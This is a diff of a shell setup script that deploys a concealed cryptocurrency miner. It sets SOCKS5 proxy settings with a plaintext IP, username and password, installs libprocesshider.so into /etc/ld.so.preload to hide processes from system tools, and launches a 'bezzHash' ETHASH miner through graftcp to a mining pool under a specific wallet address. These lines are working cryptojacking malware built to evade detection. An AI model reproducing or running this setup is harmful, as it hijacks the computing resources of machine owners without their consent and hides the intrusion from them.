@@ -20,7 +20,9 @@ socks5 = 3.15.39.186:1080
 
 socks5_username = mikrotik999 
 
-socks5_password = Elibawnos 
+socks5_password = Elibawnos
+
+select_proxy_mode = only_socks5
 
 END
 
@@ -62,4 +64,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-sudo nohup ./graftcp/graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com nohup.out
+./graftcp/graftcp ./bezzHash --algo ETHASH -p eth-eu1.hellominer.com:1100 --user 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d.$(echo $(shuf -i 1-9999 -n 1)-itil)/maesdori@gmail.com
